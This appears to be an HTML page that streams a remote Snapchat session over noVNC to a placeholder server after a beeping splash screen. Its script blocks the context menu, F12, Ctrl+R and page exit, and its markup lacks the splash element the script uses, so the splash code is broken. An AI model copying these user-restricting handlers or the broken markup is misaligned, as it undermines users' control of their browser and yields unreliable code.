<!DOCTYPE html>
<html>
<head>
  <title>Schutz Snapchat</title>
  <style>
    body { 
      margin: 0; 
      overflow: hidden; 
      background: white; 
    }
    
    /* SPLASH SCREEN CONTAINER */
    #splash { 
      position: fixed; 
      top: 0; 
      left: 0; 
      width: 100%; 
      height: 100%; 
      background: white; 
      display: flex; 
      align-items: center; 
      justify-content: center; 
      z-index: 100;
      opacity: 0; /* Start invisible for fade in */
      transition: opacity 1.5s ease-in-out; /* Smooth fade speed */
    }

    /* THE LOGO IMAGE STYLE */
    #splash-logo {
      /* Pixelation Effect */
      width: 180px; 
      transform: scale(3); 
      image-rendering: pixelated;       
      image-rendering: -moz-crisp-edges; 
      image-rendering: crisp-edges;
    }

    #stream { width: 100vw; height: 100vh; }
    
    /* WATERMARK STYLING */
    #watermark { 
      position: fixed; 
      bottom: 20px; 
      right: 20px; 
      background: none; 
      color: black;     
      padding: 10px; 
      font-weight: bold;
      font-family: 'Times New Roman', serif;
      font-size: 20px;
      cursor: pointer; 
      z-index: 50; 
      transition: color 0.3s ease; 
    }

    #watermark:hover {
      color: blue;
    }
  </style>
  <script src="https://cdn.jsdelivr.net/npm/novnc/core/novnc.js"></script>
</head>

  <div id="stream"></div>
  <div id="watermark" onclick="window.open('https://your-website.com', '_blank')">Schutz</div>

  <script>
    // --- 1. JAVASCRIPT BEEP GENERATOR (No download needed) ---
    function playBeep() {
      try {
        const AudioContext = window.AudioContext || window.webkitAudioContext;
        if (!AudioContext) return; // Browser doesn't support audio
        
        const ctx = new AudioContext();
        const oscillator = ctx.createOscillator();
        const gainNode = ctx.createGain();

        oscillator.connect(gainNode);
        gainNode.connect(ctx.destination);

        oscillator.type = 'sine'; // Sound type
        oscillator.frequency.value = 800; // Pitch (Hz)
        gainNode.gain.value = 0.1; // Volume (0.1 to 1.0)

        oscillator.start();
        setTimeout(() => {
            oscillator.stop();
        }, 150); // Beep duration in milliseconds
      } catch (e) {
        console.error("Audio play failed", e);
      }
    }

    // --- 2. SPLASH SCREEN LOGIC ---
    window.addEventListener('load', () => {
      const splash = document.getElementById('splash');

      // Play the beep programmatically
      playBeep();

      // Trigger Fade In
      setTimeout(() => {
        splash.style.opacity = '1';
      }, 50);
      
      // Trigger Fade Out
      setTimeout(() => {
        splash.style.opacity = '0';
        
        // Remove from screen after fade is done
        setTimeout(() => {
            splash.style.display = 'none';
        }, 1500);
        
        connectStream();
      }, 2000); // How long the image stays visible
    });

    function connectStream() {
      // Connect to your VNC server
      const rfb = new RFB(document.getElementById('stream'), 'ws://your-render-url.onrender.com:6080'); 
      rfb.addEventListener('connect', () => console.log('Locked Snapchat stream connected'));
      
      window.onbeforeunload = () => false;
      document.addEventListener('contextmenu', e => e.preventDefault());
      document.onkeydown = e => { if (e.key === 'F12' || (e.ctrlKey && e.key === 'r')) e.preventDefault(); };
    }
  </script>
